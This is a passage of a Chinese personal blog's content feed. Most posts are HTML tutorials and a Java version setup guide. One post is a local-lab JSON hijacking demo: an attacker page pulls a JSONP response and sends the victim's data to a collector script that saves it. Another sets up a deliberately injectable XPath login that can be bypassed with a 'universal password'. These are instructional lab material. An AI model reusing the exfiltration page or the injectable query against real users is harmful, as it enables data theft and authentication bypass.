class="name">td</span>&gt;</span>张飞<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>22<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>3<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>关羽<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>33<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>总数<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">"2"</span>&gt;</span>3人<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">"1"</span> <span class="attr">cellpadding</span>=<span class="string">"10"</span> <span class="attr">cellspacing</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>#<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>名字<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>年龄<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>1<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>刘备<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>11<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>2<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>张飞<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>22<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>3<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>关羽<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">rowspan</span>=<span class="string">"2"</span>&gt;</span>33<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>4<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>小羽<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">&lt;!--a 标签的使用  top返回最上面--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">a</span> <span class="attr">name</span>=<span class="string">"top"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#top"</span>&gt;</span>返回头部<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>



<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>HTML</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>html</tag>
        <tag>标签的使用</tag>
      </tags>
  </entry>
  <entry>
    <title>【HTML】Form表单中Input的使用</title>
    <url>/posts/52.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="form表单截图样式"><a href="#form表单截图样式" class="headerlink" title="form表单截图样式"></a>form表单截图样式</h1><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210707144322530.png" alt="image-20210707144322530"></p>
<h1 id="form表单中input"><a href="#form表单中input" class="headerlink" title="form表单中input"></a>form表单中input</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span>  <span class="comment">&lt;!--字符集 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>form表单和input<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--表单POST传参 --&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--value：默认值 maxlength：最大长度限制 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">enctype</span>=<span class="string">"initial-scale"</span>&gt;</span>  </span><br><span class="line">		账号：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">size</span>=<span class="string">"30"</span> <span class="attr">maxlength</span>=<span class="string">"10"</span> <span class="attr">value</span>=<span class="string">"admin"</span> <span class="attr">readonly</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span> </span><br><span class="line">		密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">size</span>=<span class="string">"30"</span> <span class="attr">maxlength</span>=<span class="string">"10"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">			<span class="comment">&lt;!--hidden隐藏域 --&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"token"</span> <span class="attr">value</span>=<span class="string">"waffawafaw"</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"reset"</span> <span class="attr">value</span>=<span class="string">"重置"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">&lt;!--文件上传模式 --&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span>  </span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">&lt;!--button文件上传模式 --&gt;</span>		</span><br><span class="line">		<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span>  </span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"提交"</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">&lt;!--搜索模式 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"get"</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span>  </span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"seach"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"搜索"</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>



<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>HTML</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>html</tag>
        <tag>input</tag>
        <tag>Form</tag>
      </tags>
  </entry>
  <entry>
    <title>【Json劫持】Json的劫持原理</title>
    <url>/posts/107.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>Json劫持形式</li>
</ul>
</blockquote>
<h1 id="Json劫持"><a href="#Json劫持" class="headerlink" title="Json劫持"></a>Json劫持</h1><p><strong>当前目录创建三个文件</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210820160835343.png" alt="image-20210820160835343"></p>
</blockquote>
<p>然后json.php中写入</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: GuYing</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021/8/15</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">header(<span class="string">'Content-type: application/json'</span>);</span><br><span class="line">$callback = $_GET[<span class="string">'callback'</span>];</span><br><span class="line"><span class="keyword">print</span> $callback.<span class="string">'(&#123;"id":"1","name":"dongjun","email":"qq@Qmo.com"&#125;);'</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>下面一个jsonre.php中写入来获取信息</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$content = $_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($content))&#123;</span><br><span class="line">    file_put_contents(<span class="string">'flag.txt'</span>,<span class="string">'更新时间:'</span>.date(<span class="string">"Y-m-d H:i:s"</span>).<span class="string">"\n"</span>.$content);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'no data input'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>最后一个index.html写一个网站来发包，获取数据传入jsonre.php中，json利用是和csrf很像的，都是需要被攻击者点击，index.html中写入</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">		<span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">(data)</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">			<span class="comment">//alert(v.name);</span></span></span><br><span class="line"><span class="actionscript">			<span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">			<span class="keyword">var</span> url = <span class="string">"http://127.0.0.1/json-xpath/jsonre.php?file="</span> + <span class="built_in">JSON</span>.stringify(data);</span></span><br><span class="line"><span class="actionscript">			xmlhttp.open(<span class="string">"GET"</span>,url,<span class="literal">true</span>);</span></span><br><span class="line">			xmlhttp.send();</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://127.0.0.1/json-xpath/json.php?callback=test"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>json.php显示的数据</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210820161123548.png" alt="image-20210820161123548"></p>
</blockquote>
<p>当受害者打开index.html之后，就会将json数据发给攻击方</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210820161303482.png" alt="image-20210820161303482"></p>
</blockquote>
<p>本地生成数据.txt的形式</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210820161627806.png" alt="image-20210820161627806"></p>
</blockquote>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>HTML</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>Json劫持</tag>
      </tags>
  </entry>
  <entry>
    <title>【Xpath注入】xpath注入的原理</title>
    <url>/posts/104.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>Xpath注入形式</li>
</ul>
</blockquote>
<h1 id="Xpath注入"><a href="#Xpath注入" class="headerlink" title="Xpath注入"></a>Xpath注入</h1><p><strong>当前目录创建xpath.php、xpath_user.xml</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210820160428212.png" alt="image-20210820160428212"></p>
</blockquote>
<p>然后php中写入</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">	&lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;form method=<span class="string">"POST"</span>&gt;</span><br><span class="line">		用户名：&lt;input type=<span class="string">"text"</span> name=<span class="string">"username"</span>&gt;&lt;br/&gt;</span><br><span class="line">		密码：&lt;input type=<span class="string">"password"</span> name=<span class="string">"password"</span>&gt;&lt;br/&gt;</span><br><span class="line">		&lt;input type=<span class="string">"submit"</span> value=<span class="string">"Login"</span> name=<span class="string">"submit"</span>&gt;</span><br><span class="line">	&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: GuYing</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021/8/15</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">if</span>(file_exists(<span class="string">'xpath_user.xml'</span>))&#123;</span><br><span class="line">	$xml=simplexml_load_file(<span class="string">'xpath_user.xml'</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>($_POST[<span class="string">'submit'</span>])&#123;</span><br><span class="line">		$username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">		$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">		$sql=<span class="string">"user[@username='&#123;$username&#125;' and @password='&#123;$password&#125;']"</span>;</span><br><span class="line">		$result = $xml-&gt;xpath($sql);</span><br><span class="line">		<span class="keyword">if</span>(count($result)!=<span class="number">0</span>)&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'Success'</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'failed'</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// foreach($xml as $v)</span></span><br><span class="line">		<span class="comment">// &#123;</span></span><br><span class="line">		<span class="comment">// 	if($v['username']==$username)</span></span><br><span class="line">		<span class="comment">// 		if($v['password']==$password)</span></span><br><span class="line">		<span class="comment">// 			echo '登陆成功';</span></span><br><span class="line">		<span class="comment">// 		else&#123;</span></span><br><span class="line">		<span class="comment">// 			echo '密码错误';</span></span><br><span class="line">		<span class="comment">// 		&#125;</span></span><br><span class="line">		<span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>下面一个xml文件中写入</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">users</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span> <span class="attr">id</span>=<span class="string">"1"</span> <span class="attr">username</span>=<span class="string">"admin"</span> <span class="attr">password</span>=<span class="string">"admin"</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span> <span class="attr">id</span>=<span class="string">"2"</span> <span class="attr">username</span>=<span class="string">"root"</span> <span class="attr">password</span>=<span class="string">"admin"</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span> <span class="attr">id</span>=<span class="string">"3"</span> <span class="attr">username</span>=<span class="string">"system"</span> <span class="attr">password</span>=<span class="string">"admin"</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">users</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>这样就搭建一个xpath形式的登陆框，一样可以使用万能密码登陆</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210820160619564.png" alt="image-20210820160619564"></p>
</blockquote>
<h1 id="我的个博客"><a href="#我的个博客" class="headerlink" title="我的个博客"></a>我的个博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>HTML</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>Xpath注入</tag>
      </tags>
  </entry>
  <entry>
    <title>【小知识】windows中java同时两个版本java8和java16混用</title>
    <url>/posts/51.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="jdk8-和jdk16以及其他版本同时安装混合使用方法"><a href="#jdk8-和jdk16以及其他版本同时安装混合使用方法" class="headerlink" title="jdk8 和jdk16以及其他版本同时安装混合使用方法"></a>jdk8 和jdk16以及其他版本同时安装混合使用方法</h1><blockquote>
<ul>
<li><h2 id="一、首先去下载jdk8和jdk16"><a href="#一、首先去下载jdk8和jdk16" class="headerlink" title="一、首先去下载jdk8和jdk16"></a>一、首先去下载jdk8和jdk16</h2><ul>
<li>jdk16-<a href="https://www.oracle.com/java/technologies/javase-jdk16-downloads.html" target="_blank" rel="noopener">https://www.oracle.com/java/technologies/javase-jdk16-downloads.html</a></li>
<li>jdk-8u291-<a href="https://www.oracle.com/java/technologies/javase/javase-jdk8-downloads.html" target="_blank" rel="noopener">https://www.oracle.com/java/technologies/javase/javase-jdk8-downloads.html</a></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210705155505689.png" alt="image-20210705155505689"></li>
</ul>
</li>
<li><h2 id="二、环境配置变量（此电脑-gt-属性-gt-高级系统设置-gt-环境变量）"><a href="#二、环境配置变量（此电脑-gt-属性-gt-高级系统设置-gt-环境变量）" class="headerlink" title="二、环境配置变量（此电脑-&gt;属性-&gt;高级系统设置-&gt;环境变量）"></a>二、环境配置变量（此电脑-&gt;属性-&gt;高级系统设置-&gt;环境变量）</h2><ul>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210705154325320.png" alt="image-20210705154325320"></p>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210705154457518.png" alt="image-20210705154457518"></p>
</li>
<li><h4 id="变量名：JAVA-HOME"><a href="#变量名：JAVA-HOME" class="headerlink" title="变量名：JAVA_HOME"></a>变量名：JAVA_HOME</h4></li>
<li><h4 id="变量值：C-Program-Files-Java-jdk16-刚刚复制的路径"><a href="#变量值：C-Program-Files-Java-jdk16-刚刚复制的路径" class="headerlink" title="变量值：C:\Program Files\Java\jdk16(刚刚复制的路径)"></a>变量值：C:\Program Files\Java\jdk16(刚刚复制的路径)</h4></li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210705154552837.png" alt="image-20210705154552837"></p>
</li>
<li><h4 id="变量名：CLASSPATH"><a href="#变量名：CLASSPATH" class="headerlink" title="变量名：CLASSPATH"></a>变量名：CLASSPATH</h4></li>
<li><h4 id="变量值：-JAVA-HOME-lib-dt-jar-JAVA-HOME-lib-tools-jar"><a href="#变量值：-JAVA-HOME-lib-dt-jar-JAVA-HOME-lib-tools-jar" class="headerlink" title="变量值：.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar"></a>变量值：.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar</h4></li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210705154734645.png" alt="image-20210705154734645"></p>
</li>
